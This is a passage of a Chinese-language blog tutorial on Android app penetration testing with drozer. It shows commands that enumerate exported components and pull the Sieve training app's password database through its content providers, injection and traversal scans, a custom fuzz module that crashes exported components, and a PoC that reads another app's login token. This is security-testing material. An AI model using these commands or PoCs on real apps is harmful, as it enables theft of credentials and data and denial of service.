<p>run app.provider.download content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;data&#x2F;data&#x2F;com.mwr.example.sieve&#x2F;databases&#x2F;database.db &#x2F;Users&#x2F;tea&#x2F;Downloads&#x2F;databse.db</p>
<p>任意下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .</span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>


<p>获取service信息<br>获取是exported状态的services的命令<br>run app.service.info -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.AuthService</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.CryptoService</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>

<p>向服务发送消息<br>run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3</p>
<p>run app.service.send com.example.srv com.example.srv.Service –msg 1 2 3 –extra float value 0.1324 –extra string test value</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3</span><br><span class="line">Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:</span><br><span class="line">  what: 111111</span><br><span class="line">  arg1: 0</span><br><span class="line">  arg2: 0</span><br><span class="line">  Empty</span><br></pre></td></tr></table></figure>


<p>关于service模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; cd app</span><br><span class="line">dz#app&gt; cd service</span><br><span class="line">dz#app.service&gt; ls</span><br><span class="line">app.service.info   Get information about exported services                      </span><br><span class="line">app.service.send   Send a Message to a service, and display the reply           </span><br><span class="line">app.service.start  Start Service                                                </span><br><span class="line">app.service.stop   Stop Service  </span><br></pre></td></tr></table></figure>

<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list #设备中已安装的包</span><br><span class="line">dz&gt; run app.package.list -f sieve #关键字查找包名</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br><span class="line"></span><br><span class="line">dz&gt; run app.package.info --help </span><br><span class="line"></span><br><span class="line">dz&gt; run app.package.info --package [包名]</span><br><span class="line"></span><br><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve #查看包信息</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10152</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line">  </span><br><span class="line">Application Label 显示app的名称</span><br><span class="line">Process Name 显示运行该app的进程名称</span><br><span class="line">Version 所安装的app的版本</span><br><span class="line">Data Directory 用来存储用户数据以及明确与该app关联的应用程序目录完整路径</span><br><span class="line">APK Path 设备中app真正的package文件所在的路径</span><br><span class="line">UID 与该app关联的用户ID </span><br><span class="line">GID 与该app的用户ID相关联的系统group id</span><br><span class="line">Shared Libraries 该app使用的共享库的完整路径</span><br><span class="line">Shared User ID 可以使用该app的共享用户的ID</span><br><span class="line">Use Permissions app的权限列表</span><br><span class="line"></span><br><span class="line"># 根据包的权限寻找包</span><br><span class="line">dz&gt; run app.package.info -p [权限标识]</span><br><span class="line">dz&gt; run app.package.info -p android.permission.INTERNET</span><br><span class="line"></span><br><span class="line"># 列出导出的activity</span><br><span class="line">dz&gt; run app.activity.info</span><br><span class="line"></span><br><span class="line"># 根据名称搜索activity</span><br><span class="line">dz&gt; run app.activity.info --filter [activity名]</span><br><span class="line">dz&gt; run app.activity.info --filter facebook</span><br><span class="line">dz&gt; run app.activity.info --f facebook</span><br><span class="line"></span><br><span class="line"># 搜索指定包中的activity</span><br><span class="line">dz&gt; run app.activity.info --package [package名]</span><br><span class="line">dz&gt; run app.activity.info -a [package名]</span><br><span class="line">dz&gt; run app.activity.info -a com.android.phone</span><br><span class="line"></span><br><span class="line"># 枚举content provider</span><br><span class="line">dz&gt; run app.provider.info</span><br><span class="line">dz&gt; run app.provider.info -a [包名] #包名称进行搜索</span><br><span class="line">dz&gt; run app.provider.info -p [权限标识] # 权限进行搜索</span><br><span class="line"></span><br><span class="line"># 枚举service</span><br><span class="line">dz&gt; run app.service.info --package [包名]</span><br><span class="line">dz&gt; run app.service.info -p [权限标识]</span><br><span class="line"></span><br><span class="line"># 根据service名进行搜索</span><br><span class="line">dz&gt; run app.service.info -f [过滤字符串]</span><br><span class="line">dz&gt; run app.service.info -filter [过滤字符串]</span><br><span class="line"></span><br><span class="line"># 列出未导出的service</span><br><span class="line">dz&gt; run app.service.info -u</span><br><span class="line">dz&gt; run app.service.info --unexported</span><br><span class="line">dz&gt; run app.service.info --help</span><br><span class="line"></span><br><span class="line"># 攻击点</span><br><span class="line">run app.package.attacksurface xx.xx.xx</span><br><span class="line"></span><br><span class="line"># 启动activity</span><br><span class="line">run app.activity.start --component xx.xx.xx xx.xx.Activity</span><br><span class="line"></span><br><span class="line">&gt; list  //列出目前可用的模块，也可以使用ls</span><br><span class="line">&gt; help app.activity.forintent       //查看指定模块的帮助信息</span><br><span class="line">&gt; run app.package.list      //列出android设备中安装的app</span><br><span class="line">&gt; run app.package.info -a com.android.browser       //查看指定app的基本信息</span><br><span class="line">&gt; run app.activity.info -a com.android.browser      //列出app中的activity组件</span><br><span class="line">&gt; run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面</span><br><span class="line">&gt; run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Provider</span><br><span class="line">&gt; run  app.provider.query content://settings/secure --selection &quot;name=&#x27;adb_enabled&#x27;&quot;    //读取指定Content Provider内容</span><br><span class="line">&gt; run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件</span><br><span class="line">&gt; run shell.start       //shell操作</span><br><span class="line">&gt; run tools.setup.busybox       //安装busybox</span><br><span class="line">&gt; list auxiliary        //通过web的方式查看content provider组件的相关内容</span><br><span class="line">&gt; help auxiliary.webcontentresolver     //webcontentresolver帮助</span><br><span class="line">&gt; run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问</span><br><span class="line">以sieve示例</span><br><span class="line">&gt; run app.package.list -f sieve         //查找sieve应用程序</span><br><span class="line">&gt; run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息</span><br><span class="line">&gt; run app.package.attacksurface com.mwr.example.sieve   //确定攻击面</span><br><span class="line">&gt; run app.activity.info -a com.mwr.example.sieve         //获取activity信息</span><br><span class="line">&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist</span><br><span class="line">&gt; run app.provider.info -a com.mwr.example.sieve        //提供商信息</span><br><span class="line">&gt; run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 </span><br><span class="line">&gt;run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址</span><br><span class="line">&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;   //检测注入</span><br><span class="line">&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据</span><br><span class="line">&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据</span><br><span class="line">&gt; run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址</span><br><span class="line">&gt; run scanner.provider.traversal -a com.mwr.example.sieve</span><br><span class="line">&gt; run app.service.info -a com.mwr.example.sieve         //查看服务</span><br></pre></td></tr></table></figure>
<p>显式 intent开启浏览器:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.android.browser   com.android.browser.BrowserActivity --flags ACTIVITY_NEW_TASK</span><br></pre></td></tr></table></figure>

<p>隐式 intent开启浏览器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --flags ACTIVITY_NEW_TASK</span><br></pre></td></tr></table></figure>
<p>更多命令查看：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cch139745/article/details/53519900">Drozer模块命令大全（一）</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cch139745/article/details/53691123">Drozer模块命令大全（二）</a>  </p>
<h2 id="正式利用"><a href="#正式利用" class="headerlink" title="正式利用"></a>正式利用</h2><p><strong>对activity进行fuzz自动化测试本地拒绝服务</strong><br>模块代码<br>fuzz.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from drozer import android</span><br><span class="line">from drozer.modules import common, Module</span><br><span class="line"></span><br><span class="line">class Deny(Module, common.Filters, common.PackageManager):</span><br><span class="line"></span><br><span class="line">    name = &quot;find NullPointerException&quot;</span><br><span class="line">    description = &quot;.&quot;</span><br><span class="line">    examples = &quot;&quot;&quot;</span><br><span class="line">    dz&gt; run app.package.deny com.android.browser</span><br><span class="line">    6 activities exported</span><br><span class="line">    4 broadcast receivers exported</span><br><span class="line">    1 content providers exported</span><br><span class="line">    0 services exported&quot;&quot;&quot;</span><br><span class="line">    author = &quot;ydalien&quot;</span><br><span class="line">    date = &quot;2017-01-02&quot;</span><br><span class="line">    license = &quot;BSD (3 clause)&quot;</span><br><span class="line">    path = [&quot;exp&quot;, &quot;fuzz&quot;]</span><br><span class="line">    permissions = [&quot;com.mwr.dz.permissions.GET_CONTEXT&quot;]</span><br><span class="line"></span><br><span class="line">    def add_arguments(self, parser):</span><br><span class="line">        parser.add_argument(&quot;package&quot;, help=&quot;the identifier of the package to inspect&quot;)</span><br><span class="line"></span><br><span class="line">    def attack(self,component,package,flags):</span><br><span class="line">        act=None</span><br><span class="line">        cat=None</span><br><span class="line">        data=None</span><br><span class="line">        comp=(package,component.name)</span><br><span class="line">        extr=None</span><br><span class="line">        flgs=None</span><br><span class="line"></span><br><span class="line">        if(flags==&#x27;activity&#x27;):</span><br><span class="line">            flgs =[&#x27;ACTIVITY_NEW_TASK&#x27;]</span><br><span class="line"></span><br><span class="line">        intent = android.Intent(action=act,component=comp,category=cat,data_uri=None, extras=extr, flags=flgs, mimetype=None)</span><br><span class="line"></span><br><span class="line">        if intent.isValid():</span><br><span class="line">            if(flags==&#x27;activity&#x27;):</span><br><span class="line">                self.getContext().startActivity(intent.buildIn(self))</span><br><span class="line">            if(flags==&#x27;service&#x27;):</span><br><span class="line">                self.getContext().startService(intent.buildIn(self))</span><br><span class="line">            if(flags == &#x27;receiver&#x27;):</span><br><span class="line">                self.getContext().sendBroadcast(intent.buildIn(self))</span><br><span class="line">        else:</span><br><span class="line">            self.stderr.write(&quot;[-] Invalid Intent!n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def execute(self, arguments):</span><br><span class="line">        if arguments.package != None:</span><br><span class="line">            package = self.packageManager().getPackageInfo(arguments.package, common.PackageManager.GET_ACTIVITIES | common.PackageManager.GET_RECEIVERS | common.PackageManager.GET_PROVIDERS | common.PackageManager.GET_SERVICES)</span><br><span class="line">            application = package.applicationInfo</span><br><span class="line"></span><br><span class="line">            activities = self.match_filter(package.activities, &#x27;exported&#x27;, True)</span><br><span class="line">            receivers = self.match_filter(package.receivers, &#x27;exported&#x27;, True)</span><br><span class="line">            providers = self.match_filter(package.providers, &#x27;exported&#x27;, True)</span><br><span class="line">            services = self.match_filter(package.services, &#x27;exported&#x27;, True)</span><br><span class="line"></span><br><span class="line">            self.stdout.write(&quot;Attack Surface:n&quot;)</span><br><span class="line">            self.stdout.write(&quot;  %d activities exportedn&quot; % len(activities))</span><br><span class="line">            self.stdout.write(&quot;  %d broadcast receivers exportedn&quot; % len(receivers))</span><br><span class="line">            self.stdout.write(&quot;  %d content providers exportedn&quot; % len(providers))</span><br><span class="line">            self.stdout.write(&quot;  %d services exportedn&quot; % len(services))</span><br><span class="line"></span><br><span class="line">            if (application.flags &amp; application.FLAG_DEBUGGABLE) != 0:</span><br><span class="line">                self.stdout.write(&quot;    is debuggablen&quot;)</span><br><span class="line"></span><br><span class="line">            if package.sharedUserId != None:</span><br><span class="line">                self.stdout.write(&quot;    Shared UID (%s)n&quot; % package.sharedUserId)</span><br><span class="line"></span><br><span class="line">            actions=[activities,receivers,services]</span><br><span class="line">            action_str=[&#x27;activity&#x27;,&#x27;receiver&#x27;,&#x27;service&#x27;]</span><br><span class="line">            i=-1</span><br><span class="line">            try:</span><br><span class="line">                for action in actions:</span><br><span class="line">                    i+=1</span><br><span class="line">                    if len(action) &gt; 0:</span><br><span class="line">                        for tmp in action:</span><br><span class="line">                            try:</span><br><span class="line">                                if len(tmp.name) &gt; 0:</span><br><span class="line">                                    self.stdout.write(&quot; [+]%s name:%sn&quot; % (action_str[i],tmp.name))</span><br><span class="line">                                    self.attack(component=tmp, package=arguments.package, flags=action_str[i])</span><br><span class="line">                            except Exception, e:</span><br><span class="line">                                self.stdout.write(&quot; error--&gt;%s name:%sn&quot; % (action_str,tmp.name))</span><br><span class="line">                                self.stdout.write(&quot; errorcontent:%sn&quot; % e)</span><br><span class="line">                                continue</span><br><span class="line">            except:</span><br><span class="line">                self.stdout.write(&quot; error&quot;)</span><br><span class="line">        else:</span><br><span class="line">            self.stdout.write(&quot;No package specifiedn&quot;)</span><br></pre></td></tr></table></figure>

<p>创建自己的moudle仓库<br>module repository create &#x2F;Users&#x2F;tea&#x2F;Documents&#x2F;tools&#x2F;android&#x2F;drozer-modules-bytea<br>把fuzz.py放到目录里<br>安装模块<br>module install &#x2F;Users&#x2F;tea&#x2F;Documents&#x2F;tools&#x2F;android&#x2F;drozer-modules-bytea&#x2F;fuzz.py</p>
<p>运行fuzz<br>run exp.fuzz.deny com.mwr.example.sieve</p>
<p>新开个命令行监听运行异常日志<br>adb logcat | grep java.lang.RuntimeException </p>
<p>手工启动actvity<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drozer:</span><br><span class="line">run app.activity.start --component com.xx.xx com.xx.xx.XXEntryActivity</span><br><span class="line"></span><br><span class="line">adb shell:</span><br><span class="line">adb shell am start -n com.xx.xx/com.xx.xx.XXEntryActivity </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/3.jpg"></p>
<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">    protected void onCreate(Bundle savedInstanceState)&#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button =(Button) findViewById(R.id.button);</span><br><span class="line">    button.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            /*</span><br><span class="line">            Uri uri=Uri.parse(&quot;content://com.alipay.ali.authlogin/aliuser_sdk_sso&quot;);</span><br><span class="line">            Cursor cursor=getContentResolver().query(uri, null, null, null, null);</span><br><span class="line">            if(cursor!=null)&#123;</span><br><span class="line">                String id=cursor.getString(cursor.getColumnIndex(&quot;loginId&quot;));</span><br><span class="line">                String img=cursor.getString(cursor.getColumnIndex(&quot;headImg&quot;));</span><br><span class="line">                String token=cursor.getString(cursor.getColumnIndex(&quot;alipaySsoToken&quot;));</span><br><span class="line">                System.out.println(id);</span><br><span class="line">                //Toast.makeText(context, id+&quot;&quot;+img+&quot;&quot;+token, Toast.LENGTH_SHORT);    </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cursor.close();</span><br><span class="line">            */</span><br><span class="line">            //Intent v2=new Intent(&quot;com.xx.idlefish.DATA_EXPORT&quot;);</span><br><span class="line">            Intent v2=new Intent();</span><br><span class="line">            v2.setClassName(&quot;xx.xx.xx&quot;, &quot;xx.xx.xx.xxx.xxx.xxx&quot;);</span><br><span class="line">            //v2.setClassName(&quot;tv.xx.bili&quot;, &quot;com.mall.ui.base.MallSigalTaskWebFragmentLoadActivity&quot;);</span><br><span class="line">            //v2.addCategory(&quot;android.intent.category.BROWSABLE&quot;);</span><br><span class="line">            //v2.putExtra(&quot;id&quot;, &quot;a&quot;);</span><br><span class="line">            //v2.putExtra(&quot;c&quot;, &quot;exportData&quot;);</span><br><span class="line"></span><br><span class="line">            //v2.putExtra(&quot;_fragment&quot;, &quot;com.mall.base.web.MallWebFragment&quot;);</span><br><span class="line">            //v2.setData(Uri.parse(&quot;file:///storage/emulated/0/tencent/MicroMsg/Download/2.html&quot;));</span><br><span class="line">            //v2.putExtra(&quot;intent_bundle_nameintent_bundle_name&quot;,&quot;a&quot;);</span><br><span class="line">            //v2.putExtra(&quot;bundle_select_limit_num&quot;,1);</span><br><span class="line">            //v2.setData(Uri.parse(&quot;&quot;));</span><br><span class="line">            startActivity(v2);</span><br><span class="line">            //startService(v2);</span><br><span class="line">            //sendBroadcast(v2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);    </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/tea9/android_app_src_poc">android_app_src_poc</a>  </p>
<h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer-modules">https://github.com/FSecureLABS/drozer-modules</a></p>
<p>下载的module<br><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer-modules">https://github.com/FSecureLABS/drozer-modules</a></p>
<p>创建自己的moudle仓库，导入刚刚下载的官方插件<br>新建文件夹<br>module repository create &#x2F;XXX&#x2F;Android&#x2F;drozer-modules-master</p>
<p>安装模块：安装下载下来的drozer-modules里的模块<br>module install &#x2F;XXXX&#x2F;Android&#x2F;drozer-modules-master&#x2F;intents&#x2F;fuzzinozer.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea1</span><br><span class="line">Initialised repository at /Users/tea/Documents/tools/android/drozer-modules-bytea1.</span><br><span class="line"></span><br><span class="line">dz&gt; module install /Users/tea/Documents/tools/android/drozer-modules/intents/fuzzinozer.py</span><br><span class="line">You have 2 drozer Module Repositories. Which would you like to install into?</span><br><span class="line"></span><br><span class="line">      1  /Users/tea/Documents/tools/android/drozer-modules-bytea</span><br><span class="line">      2  /Users/tea/Documents/tools/android/drozer-modules-bytea1</span><br><span class="line"></span><br><span class="line">repo&gt; 1</span><br><span class="line"></span><br><span class="line">Processing /Users/tea/Documents/tools/android/drozer-modules/intents/fuzzinozer.py... Already Installed.</span><br><span class="line"></span><br><span class="line">Successfully installed 0 modules, 1 already installed.</span><br></pre></td></tr></table></figure>

<p>运行刚刚安装的模块<br>run intents.fuzzinozer –fuzzing_intent –package_name com.mwr.example.sieve</p>
<p>run intents.fuzzinozer –help<br>run intents.fuzzinozer –package_name com.android.bluetoothmidiservice –dos_attack 35<br>Android Intent Fuzzing Module for Drozer</p>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/drozer%E6%A8%A1%E5%9D%97%E7%9A%84%E7%BC%96%E5%86%99%E5%8F%8A%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6.html">https://wooyun.js.org/drops/drozer%E6%A8%A1%E5%9D%97%E7%9A%84%E7%BC%96%E5%86%99%E5%8F%8A%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6.html</a></p>
<p>开源库<br><a target="_blank" rel="noopener" href="https://github.com/kelvinBen/DrozerFuzz">https://github.com/kelvinBen/DrozerFuzz</a></p>
<h2 id="drozer-fuzz"><a href="#drozer-fuzz" class="headerlink" title="drozer-fuzz"></a>drozer-fuzz</h2><p><a target="_blank" rel="noopener" href="https://events.ccc.de/congress/2015/wiki/images/8/8d/Ccc_pdf_fuzzinozer.pdf">Android Intent Fuzzing Module for Drozer</a><br><a target="_blank" rel="noopener" href="https://myslide.cn/slides/14248">Binder Fuzz based on drozer</a><br><a target="_blank" rel="noopener" href="https://github.com/kelvinBen/DrozerFuzz">DrozerFuzz</a>  </p>
<h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><p>1.Run ‘pip install twisted’ to fetch this dependency.  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> drozer console connect                       tea@teadeMacBook-Pro</span><br><span class="line">/Users/tea/.pyenv/versions/2.7.17/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.</span><br><span class="line">  from cryptography import x509</span><br><span class="line">drozer Server requires Twisted to run.</span><br><span class="line">Run &#x27;pip install twisted&#x27; to fetch this dependency.</span><br></pre></td></tr></table></figure>
<p>安装<br>pip install twisted</p>
<hr>
<p>2.drozer could not find or compile a required extension library.<br>drozer console connect –debug</p>
